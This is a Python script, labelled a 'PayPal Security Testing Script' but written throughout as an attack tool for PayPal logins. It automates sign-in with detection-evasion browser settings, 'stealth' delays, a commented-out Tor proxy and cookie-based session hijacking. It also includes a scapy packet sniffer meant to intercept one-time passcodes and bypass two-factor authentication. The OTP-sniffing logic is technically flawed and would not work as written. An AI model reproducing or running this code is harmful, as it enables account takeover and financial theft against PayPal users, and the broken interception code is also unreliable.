import time
import random
import json
import imaplib
import email
from getpass import getpass
from email.header import decode_header
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
import undetected_chromedriver as uc
import scapy.all as scapy  # For network sniffing
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ---------- CONFIGURATION ----------
SESSION_COOKIE_FILE = "paypal_cookies.json"  # Store session cookies
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
# PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5) (commenting out for testing)

# ---------- LOAD & SAVE COOKIES ----------
def save_cookies(driver, filename):
    with open(filename, "w") as file:
        json.dump(driver.get_cookies(), file)

def load_cookies(driver, filename):
    try:
        with open(filename, "r") as file:
            cookies = json.load(file)
        for cookie in cookies:
            driver.add_cookie(cookie)
        driver.refresh()
        print("[*] Session restored successfully!")  # Debugging point
    except FileNotFoundError:
        print("[!] No saved session found. Logging in manually.")

# ---------- STEALTH FUNCTIONS ----------
def stealth_delay():
    time.sleep(random.uniform(2, 5))

def configure_stealth_options():
    options = ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument(f"--user-agent={USER_AGENT}")
    # options.add_argument(f"--proxy-server={PROXY}")  # Commenting this out for testing
    return options

# ---------- NETWORK SNIFFING FOR OTP INTERCEPTION ----------
def sniff_otp():
    print("[*] Sniffing network for OTP...")
    def packet_callback(packet):
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode(errors='ignore')
            if "OTP" in payload or "code" in payload:
                print(f"[+] Captured OTP: {payload}")
                return payload
    
    scapy.sniff(filter="tcp port 80 or tcp port 443", prn=packet_callback, store=0)

# ---------- BROWSER AUTOMATION ATTACK ----------
def browser_automation_attack(email, password):
    print("[*] Starting browser automation...")  # Debugging point
    options = configure_stealth_options()
    driver = uc.Chrome(options=options)
    driver.get("https://www.paypal.com/signin")
    print("[*] Opened PayPal login page...")  # Debugging point
    stealth_delay()

    load_cookies(driver, SESSION_COOKIE_FILE)

    if "summary" in driver.current_url:
        print("[+] Session restored successfully!")  # Debugging point
        return driver

    try:
        print("[*] Entering email...")  # Debugging point
        email_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.NAME, "login_email"))
        )
        email_input.send_keys(email)
        stealth_delay()

        print("[*] Clicking 'Next'...")  # Debugging point
        next_button = driver.find_element(By.ID, "btnNext")
        next_button.click()
        stealth_delay()

        print("[*] Entering password...")  # Debugging point
        password_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.NAME, "login_password"))
        )
        password_input.send_keys(password)
        stealth_delay()

        print("[*] Clicking 'Login'...")  # Debugging point
        login_button = driver.find_element(By.ID, "btnLogin")
        login_button.click()
        stealth_delay()

        # Check for OTP interception
        otp_code = sniff_otp()  # This is where the OTP is snatched
        if otp_code:
            print(f"[*] Intercepted OTP: {otp_code}")
            otp_input = WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.NAME, "otp"))
            )
            otp_input.send_keys(otp_code)
            otp_input.send_keys(Keys.RETURN)
            stealth_delay()

        # Save session cookies after successful login
        if "summary" in driver.current_url:
            print("[+] Login successful! Saving session cookies.")
            save_cookies(driver, SESSION_COOKIE_FILE)
        else:
            print("[-] Login failed.")

    except Exception as e:
        print(f"[!] Error during automation: {e}")
        driver.quit()

    return driver

# ---------- GUI WITH PROGRESS BAR ----------
from tkinter import Tk, Label, Button, Entry, filedialog
from tkinter import messagebox
from tkinter.ttk import Progressbar

def start_attack(email, password):
    print(f"[*] Starting attack for {email}...")
    driver = browser_automation_attack(email, password)
    if driver:
        print("[*] Session is now active. Proceeding with automation.")
        driver.quit()
        messagebox.showinfo("Success", "Login was successful and session is active.")
    else:
        messagebox.showerror("Error", "Something went wrong during the automation process.")

def create_gui():
    window = Tk()
    window.title("PayPal Security Testing Script")

    # Email field
    Label(window, text="PayPal Email:").grid(row=0, column=0, padx=10, pady=10)
    email_entry = Entry(window)
    email_entry.grid(row=0, column=1, padx=10, pady=10)

    # Password field
    Label(window, text="PayPal Password:").grid(row=1, column=0, padx=10, pady=10)
    password_entry = Entry(window, show="*")
    password_entry.grid(row=1, column=1, padx=10, pady=10)

    # Progress bar
    progress = Progressbar(window, orient="horizontal", length=300, mode="indeterminate")
    progress.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

    # Start Button
    def on_start():
        email = email_entry.get()
        password = password_entry.get()
        if not email or not password:
            messagebox.showwarning("Input Error", "Please enter both email and password.")
            return
        progress.start()
        start_attack(email, password)
        progress.stop()

    start_button = Button(window, text="Start Attack", command=on_start)
    start_button.grid(row=2, column=0, columnspan=2, pady=10)

    window.mainloop()

# ---------- MAIN ----------
def main():
    print("PayPal Security Testing Script")
    create_gui()

if __name__ == "__main__":
    main()
